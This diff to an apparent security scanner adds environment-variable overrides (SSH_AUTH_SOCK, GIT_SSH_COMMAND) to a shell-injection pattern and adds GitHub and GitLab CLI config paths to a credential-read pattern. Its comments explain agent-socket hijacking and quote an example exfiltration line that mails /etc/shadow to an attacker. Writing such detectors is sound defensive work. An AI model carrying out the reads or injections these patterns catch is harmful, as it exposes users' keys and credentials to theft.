@@ -335,10 +335,15 @@ const CRITICAL_PATTERNS = [
   // shape as LD_PRELOAD but at the shell-interpreter level.
   // ENV (POSIX sh equivalent) and SHELLOPTS (xtrace etc)
   // round out the set.
+  // (v1.10.204) Extended with `SSH_AUTH_SOCK=` — overriding
+  // the SSH agent socket can hijack signing requests
+  // (attacker uses the user's keys without seeing them).
+  // `GIT_SSH_COMMAND=` is the git equivalent and runs
+  // arbitrary code instead of ssh.
   {
     code: 'shell-env-inject',
-    label: 'BASH_ENV / ENV / SHELLOPTS env-var (shell startup-file injection)',
-    re: /\b(?:export\s+)?(?:BASH_ENV|ENV|SHELLOPTS|BASH_FUNC_\w+)\s*=\s*\S+/,
+    label: 'BASH_ENV / ENV / SSH_AUTH_SOCK / GIT_SSH_COMMAND (shell / agent injection)',
+    re: /\b(?:export\s+)?(?:BASH_ENV|ENV|SHELLOPTS|BASH_FUNC_\w+|SSH_AUTH_SOCK|GIT_SSH_COMMAND)\s*=\s*\S+/,
   },
   // (v1.10.64) Cron.d entry creation — anything written under
   // /etc/cron.{d,daily,hourly,weekly,monthly} runs as root on a
@@ -1124,7 +1129,7 @@ const HIGH_PATTERNS = [
     // <credential-path>` — covers `mail attacker@x < /etc/shadow`
     // and similar exfil chains where the tool isn't in the
     // explicit reader list.
-    re: /\b(?:cat|less|more|head|tail|cp|mv|tar|gzip|base64|hexdump|xxd|scp|rsync)\s+[^\n;|&]*(?:\/etc\/shadow\b|\/etc\/gshadow\b|(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/(?:\.ssh\/id_(?:rsa|ecdsa|ed25519|dsa)(?!\.pub)\b|\.aws\/(?:credentials|config)\b|\.kube\/config\b|\.docker\/config\.json\b|\.npmrc\b|\.netrc\b|\.pypirc\b))|<\s*(?:\/etc\/shadow\b|\/etc\/gshadow\b|(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/(?:\.ssh\/id_(?:rsa|ecdsa|ed25519|dsa)(?!\.pub)\b|\.aws\/(?:credentials|config)\b|\.kube\/config\b|\.docker\/config\.json\b|\.npmrc\b|\.netrc\b|\.pypirc\b))/,
+    re: /\b(?:cat|less|more|head|tail|cp|mv|tar|gzip|base64|hexdump|xxd|scp|rsync)\s+[^\n;|&]*(?:\/etc\/shadow\b|\/etc\/gshadow\b|(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/(?:\.ssh\/id_(?:rsa|ecdsa|ed25519|dsa)(?!\.pub)\b|\.aws\/(?:credentials|config)\b|\.kube\/config\b|\.docker\/config\.json\b|\.npmrc\b|\.netrc\b|\.pypirc\b|\.config\/gh\/hosts\.yml\b|\.config\/glab-cli\/config\.yml\b))|<\s*(?:\/etc\/shadow\b|\/etc\/gshadow\b|(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/(?:\.ssh\/id_(?:rsa|ecdsa|ed25519|dsa)(?!\.pub)\b|\.aws\/(?:credentials|config)\b|\.kube\/config\b|\.docker\/config\.json\b|\.npmrc\b|\.netrc\b|\.pypirc\b|\.config\/gh\/hosts\.yml\b|\.config\/glab-cli\/config\.yml\b))/,
   },
   {
     code: 'sshpass-credential',
